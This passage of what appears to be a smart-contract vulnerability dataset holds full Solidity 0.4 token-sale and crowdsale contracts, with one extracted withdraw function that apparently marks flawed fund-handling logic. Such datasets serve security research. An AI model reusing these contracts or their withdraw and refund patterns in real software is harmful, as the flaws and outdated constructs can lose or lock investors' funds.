investor) external onlyOwner {\n require(investor != 0x0 && !investorWhiteList[investor]);\n investorWhiteList[investor] = true;\n }\n function removeInvestorFromWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && investorWhiteList[investor]);\n investorWhiteList[investor] = false;\n }\n function addReferralOf(address investor, address referral) external onlyOwner {\n require(investor != 0x0 && referral != 0x0 && referralList[investor] == 0x0 && investor != referral);\n referralList[investor] = referral;\n }\n function isAllowed(address investor) constant external returns (bool result) {\n return investorWhiteList[investor];\n }\n function getReferralOf(address investor) constant external returns (address result) {\n return referralList[investor];\n }\n}\ncontract PriceReceiver {\n address public ethPriceProvider;\n modifier onlyEthPriceProvider() {\n require(msg.sender == ethPriceProvider);\n _;\n }\n function receiveEthPrice(uint ethUsdPrice) external;\n function setEthPriceProvider(address provider) external;\n}\ncontract AnythingAppTokenPreSale is Haltable, PriceReceiver {\n using SafeMath for uint;\n string public constant name = \"AnythingAppTokenPreSale\";\n AnythingAppToken public token;\n InvestorWhiteList public investorWhiteList;\n address public beneficiary;\n uint public tokenPriceUsd;\n uint public totalTokens;\n uint public ethUsdRate;\n uint public collected = 0;\n uint public withdrawn = 0;\n uint public tokensSold = 0;\n uint public investorCount = 0;\n uint public weiRefunded = 0;\n uint public startTime;\n uint public endTime;\n bool public crowdsaleFinished = false;\n mapping (address => bool) public refunded;\n mapping (address => uint) public deposited;\n uint public constant BONUS_LEVEL_1 = 40;\n uint public constant BONUS_LEVEL_2 = 35;\n uint public constant BONUS_LEVEL_3 = 30;\n uint public firstStage;\n uint public secondStage;\n uint public thirdStage;\n uint public constant MINIMAL_PURCHASE = 250 ether;\n uint public constant LIMIT_PER_USER = 500000 ether;\n event NewContribution(address indexed holder, uint tokenAmount, uint etherAmount);\n event NewReferralTransfer(address indexed investor, address indexed referral, uint tokenAmount);\n event Refunded(address indexed holder, uint amount);\n event Deposited(address indexed holder, uint amount);\n modifier preSaleActive() {\n require(block.timestamp >= startTime && block.timestamp < endTime);\n _;\n }\n modifier preSaleEnded() {\n require(block.timestamp >= endTime);\n _;\n }\n modifier inWhiteList() {\n require(investorWhiteList.isAllowed(msg.sender));\n _;\n }\n function AnythingAppTokenPreSale(\n address _token,\n address _beneficiary,\n address _investorWhiteList,\n uint _totalTokens,\n uint _tokenPriceUsd,\n uint _baseEthUsdPrice,\n uint _firstStage,\n uint _secondStage,\n uint _thirdStage,\n uint _startTime,\n uint _endTime\n ) {\n ethUsdRate = _baseEthUsdPrice;\n tokenPriceUsd = _tokenPriceUsd;\n totalTokens = _totalTokens.mul(1 ether);\n token = AnythingAppToken(_token);\n investorWhiteList = InvestorWhiteList(_investorWhiteList);\n beneficiary = _beneficiary;\n firstStage = _firstStage.mul(1 ether);\n secondStage = _secondStage.mul(1 ether);\n thirdStage = _thirdStage.mul(1 ether);\n startTime = _startTime;\n endTime = _endTime;\n }\n function() payable inWhiteList {\n doPurchase(msg.sender);\n }\n function tokenFallback(address _from, uint _value, bytes _data) public pure { }\n function doPurchase(address _owner) private preSaleActive inNormalState {\n if (token.balanceOf(msg.sender) == 0) investorCount++;\n uint tokens = msg.value.mul(ethUsdRate).div(tokenPriceUsd);\n address referral = investorWhiteList.getReferralOf(msg.sender);\n uint referralBonus = calculateReferralBonus(tokens);\n uint bonus = calculateBonus(tokens, referral);\n tokens = tokens.add(bonus);\n uint newTokensSold = tokensSold.add(tokens);\n if (referralBonus > 0 && referral != 0x0) {\n newTokensSold = newTokensSold.add(referralBonus);\n }\n require(newTokensSold <= totalTokens);\n require(token.balanceOf(msg.sender).add(tokens) <= LIMIT_PER_USER);\n tokensSold = newTokensSold;\n collected = collected.add(msg.value);\n deposited[msg.sender] = deposited[msg.sender].add(msg.value);\n token.transfer(msg.sender, tokens);\n NewContribution(_owner, tokens, msg.value);\n if (referralBonus > 0 && referral != 0x0) {\n token.transfer(referral, referralBonus);\n NewReferralTransfer(msg.sender, referral, referralBonus);\n }\n }\n function calculateBonus(uint _tokens, address _referral) private returns (uint _bonuses) {\n uint bonus;\n if (tokensSold < firstStage) {\n bonus = BONUS_LEVEL_1;\n } else if (tokensSold >= firstStage && tokensSold < secondStage) {\n bonus = BONUS_LEVEL_2;\n } else {\n bonus = BONUS_LEVEL_3;\n }\n if (_referral != 0x0) {\n bonus += 5;\n }\n return _tokens.mul(bonus).div(100);\n }\n function calculateReferralBonus(uint _tokens) internal constant returns (uint _bonus) {\n return _tokens.mul(20).div(100);\n }\n function withdraw() external onlyOwner {\n uint withdrawLimit = 500 ether;\n if (withdrawn < withdrawLimit) {\n uint toWithdraw = collected.sub(withdrawn);\n if (toWithdraw + withdrawn > withdrawLimit) {\n toWithdraw = withdrawLimit.sub(withdrawn);\n }\n beneficiary.transfer(toWithdraw);\n withdrawn = withdrawn.add(toWithdraw);\n return;\n }\n require(block.timestamp >= endTime);\n beneficiary.transfer(collected);\n token.transfer(beneficiary, token.balanceOf(this));\n crowdsaleFinished = true;\n }\n function refund() external preSaleEnded inNormalState {\n require(refunded[msg.sender] == false);\n uint refund = deposited[msg.sender];\n require(refund > 0);\n deposited[msg.sender] = 0;\n refunded[msg.sender] = true;\n weiRefunded = weiRefunded.add(refund);\n msg.sender.transfer(refund);\n Refunded(msg.sender, refund);\n }\n function receiveEthPrice(uint ethUsdPrice) external onlyEthPriceProvider {\n require(ethUsdPrice > 0);\n ethUsdRate = ethUsdPrice;\n }\n function setEthPriceProvider(address provider) external onlyOwner {\n require(provider != 0x0);\n ethPriceProvider = provider;\n }\n function setNewWhiteList(address newWhiteList) external onlyOwner {\n require(newWhiteList != 0x0);\n investorWhiteList = InvestorWhiteList(newWhiteList);\n }\n}",
  "extract_feature": [
    "function withdraw() external onlyOwner {\nuint withdrawLimit = 500 ether;\nif (withdrawn < withdrawLimit) {\nuint toWithdraw = collected.sub(withdrawn);\nif (toWithdraw + withdrawn > withdrawLimit) {\ntoWithdraw = withdrawLimit.sub(withdrawn);\n}\nbeneficiary.transfer(toWithdraw);\nwithdrawn = withdrawn.add(toWithdraw);\nreturn;\n}\nrequire(block.timestamp >= endTime);\nbeneficiary.transfer(collected);\ntoken.transfer(beneficiary, token.balanceOf(this));\ncrowdsaleFinished = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed2"
  },
  "filename": "10807.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = 